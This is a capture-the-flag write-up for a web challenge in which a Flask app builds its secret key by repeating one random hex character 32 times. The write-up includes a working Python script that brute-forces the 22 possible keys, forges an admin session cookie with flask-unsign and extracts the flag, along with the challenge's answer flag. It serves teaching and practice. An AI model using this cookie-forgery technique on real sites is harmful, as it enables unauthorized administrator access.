# SmallMistakeBigMistake

### Category

Web

### Description

The website developer made a small mistake in the code of his website.

Can you identify and exploit it to extract the flag?

URL : http://xxx

Format : **Hero{flag}**<br>
Auteur : **xanhacks**

### Files

- [main.py](./src/main.py)

### Write Up

The Flask secret is generated using the following line of code :

`app.secret_key = choice(hexdigits) * 32`

However, this line will generate a random character multiplied by 32 and not 32 random characters as you might think.

Example :

```python
>>> from random import choice
>>> from string import hexdigits
>>>
>>> hexdigits
'0123456789abcdefABCDEF'
>>> len(hexdigits)
22
>>> choice(hexdigits)
'1'
>>> choice(hexdigits)
'8'
>>> choice(hexdigits)
'b'
>>> # All characters are the same
>>> choice(hexdigits) * 32
'99999999999999999999999999999999'
>>> choice(hexdigits) * 32
'cccccccccccccccccccccccccccccccc'
>>> choice(hexdigits) * 32
'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
>>> # Example of 32 random characters
>>> "".join([choice(hexdigits) for _ in range(32)])
'98429d37F096cB6b5EB4bdD0D24d0DB9'
>>> "".join([choice(hexdigits) for _ in range(32)])
'7722Fdb6FaCeBbc10af8e3ca1894EBFe'
>>> "".join([choice(hexdigits) for _ in range(32)])
'89EEE9ef54eC78BF13bcC320Fa2b0Dab'
```

By knowing the Flask secret, you can create your own session cookie and thus get past the administrator. Just brute force the 22 (`len(hexdigits)`) possibilities.

You can do it with a simple python script :

```python
#!/usr/bin/env python3
from string import hexdigits

# python3 -m pip install requests flask-unsign
from requests import get
from flask_unsign import session, DEFAULT_SALT

for c in hexdigits:
    secret = c * 32
    session_cookie = session.sign(
        value={"username": "admin"}, secret=secret, salt=DEFAULT_SALT, legacy=False
    )

    cookies = {"session": session_cookie}
    print("Trying with '" + c + "' ...")
    req = get("http://127.0.0.1:5000/", cookies=cookies)

    if not "You are not admin !" in req.text:
        print("Flag :", req.text.split("<h3>")[1].split("</h3>")[0])
        break
```

Execution :

```bash
$ python3 solve.py
Trying with '0' ...
Trying with '1' ...
Trying with '2' ...
Trying with '3' ...
Trying with '4' ...
Trying with '5' ...
Trying with '6' ...
Trying with '7' ...
Trying with '8' ...
Trying with '9' ...
Trying with 'a' ...
Flag : Hero{Sm4ll_Mist4ke_c4n_be_d4ngerous_10853085}
```

### Flag

Hero{Sm4ll_Mist4ke_c4n_be_d4ngerous_10853085}